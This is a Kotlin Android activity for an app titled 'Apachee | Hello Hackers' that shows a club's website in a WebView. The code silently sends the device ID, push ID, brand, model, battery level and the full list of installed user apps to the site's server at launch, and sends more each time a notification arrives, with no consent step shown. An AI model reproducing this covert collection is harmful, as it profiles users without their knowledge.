package ir.apachee.app
/**
 * Dev: Mehti Mousavi
 * Telegram: @Mehdimou
 */
import android.annotation.SuppressLint
import android.app.ProgressDialog
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ActivityInfo
import android.content.pm.ApplicationInfo
import android.graphics.Bitmap
import android.net.ConnectivityManager
import android.os.BatteryManager
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.KeyEvent
import android.view.LayoutInflater
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.android.volley.AuthFailureError
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.pushpole.sdk.NotificationButtonData
import com.pushpole.sdk.NotificationData
import com.pushpole.sdk.PushPole
import org.json.JSONObject

class MainActivity : AppCompatActivity() {
    private val baseUrl = "https://apachee-club.ir/hello-hackers"

    private lateinit var uniqueID: String
    private lateinit var pushId: String
    private lateinit var phoneBrand: String
    private lateinit var phoneModel: String

    @SuppressLint("SetJavaScriptEnabled", "HardwareIds")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
        setContentView(R.layout.activity_main)
        PushPole.initialize(this, true)

        uniqueID = Settings.Secure.getString(applicationContext.contentResolver, Settings.Secure.ANDROID_ID)
        pushId = PushPole.getId(baseContext)
        phoneBrand = android.os.Build.BRAND
        phoneModel = android.os.Build.MODEL


        val mWebView = findViewById<WebView>(R.id.web)
        val btn = findViewById<Button>(R.id.button)
        val txt = findViewById<TextView>(R.id.txt)

        val actionBar = supportActionBar
        actionBar!!.setDisplayShowCustomEnabled(true)
        actionBar!!.setDisplayShowTitleEnabled(false)
        val inflater = LayoutInflater.from(this)
        val v: View = inflater.inflate(R.layout.titleview, null)
        (v.findViewById(R.id.title) as TextView).text = "Apachee | Hello Hackers"
        actionBar!!.customView = v

        if (!verifyAvailableNetwork(this)) {
            mWebView.visibility = View.INVISIBLE
            txt.visibility = View.VISIBLE
            btn.visibility = View.VISIBLE
        }else{
            sendFirstData()
        }

        val progressDialog = ProgressDialog(this@MainActivity)
        progressDialog.setMessage("Please Wait...")
        progressDialog.setCanceledOnTouchOutside(false)
        progressDialog.setCancelable(false)
        progressDialog.show()


        val webSettings = mWebView.settings
        webSettings.javaScriptEnabled = true
        mWebView.loadUrl("$baseUrl/hh.php?u=$uniqueID&pushId=$pushId")
        var isPageError = false
        mWebView.webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                isPageError = false
            }
            override fun onPageFinished(view: WebView?, url: String?) {
                progressDialog.dismiss()
                if (mWebView.url.equals("$baseUrl/hh.php?has_reg=1"))
                    mWebView.clearHistory()

                if (isPageError) {
                    mWebView.visibility = View.INVISIBLE
                    txt.visibility = View.VISIBLE
                    btn.visibility = View.VISIBLE
                }
            }

            override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
                isPageError = true
            }

        }


        btn.setOnClickListener {
            mWebView.visibility = View.VISIBLE
            txt.visibility = View.INVISIBLE
            btn.visibility = View.INVISIBLE
            mWebView.reload()
            sendFirstData()
        }
        PushPole.setNotificationListener(object : PushPole.NotificationListener {
            override fun onNotificationReceived(notificationData: NotificationData) {
                sendUpdateData()
            }

            override fun onNotificationClicked(notificationData: NotificationData) {}
            override fun onNotificationButtonClicked(notificationData: NotificationData, clickedButton: NotificationButtonData) {}
            override fun onCustomContentReceived(customContent: JSONObject) {}
            override fun onNotificationDismissed(notificationData: NotificationData) {}
        })
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        val mWebView = findViewById<WebView>(R.id.web)
        if (keyCode == KeyEvent.KEYCODE_BACK && mWebView.canGoBack()) {
            mWebView.goBack()
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    private fun verifyAvailableNetwork(activity: AppCompatActivity): Boolean {
        val connectivityManager = activity.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }


    private fun sendFirstData() {
        val batteryPercent = getBatteryPercent()
        Log.e("Battery", batteryPercent)
        val queue = Volley.newRequestQueue(applicationContext)
        val url = "$baseUrl/app/apa.php?p=$batteryPercent&pb=$phoneBrand&pm=$phoneModel&pushId=$pushId&u=$uniqueID"
        val jsonObjRequest: StringRequest =
            object : StringRequest(Method.POST, url, null, null) {
                override fun getBodyContentType(): String {
                    return "application/x-www-form-urlencoded; charset=UTF-8"
                }

                @Throws(AuthFailureError::class)
                override fun getParams(): Map<String, String> {
                    val postParam: MutableMap<String, String> = HashMap()
                    postParam["apps"] = getApplicationsList()
                    return postParam
                }
            }
        queue.add(jsonObjRequest)
    }

    private fun sendUpdateData() {
        val batteryPercent = getBatteryPercent()
        val queue = Volley.newRequestQueue(applicationContext)
        val url = "$baseUrl/app/apa.php?b=yes&p=$batteryPercent&pb=$phoneBrand&pm=$phoneModel&pushId=$pushId&u=$uniqueID"
        val stringRequest = StringRequest(com.android.volley.Request.Method.GET, url, null, null)
        queue.add(stringRequest)
    }

    private fun getBatteryPercent(): String {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { iFilter ->
            applicationContext.registerReceiver(null, iFilter)
        }
        val batteryPct: Float? = batteryStatus?.let { intent ->
            val level: Int = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale: Int = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            level * 100 / scale.toFloat()
        }
        return batteryPct.toString()
    }

    fun getApplicationsList(): String {
        var appNames = ""
        val list = packageManager.getInstalledPackages(0)
        for (i in list.indices) {
            val packageInfo = list[i]
            if (packageInfo!!.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM == 0) {
                val appName = packageInfo.applicationInfo.loadLabel(packageManager).toString()
                appNames += "$appName|||"
            }
        }
        return appNames
    }
}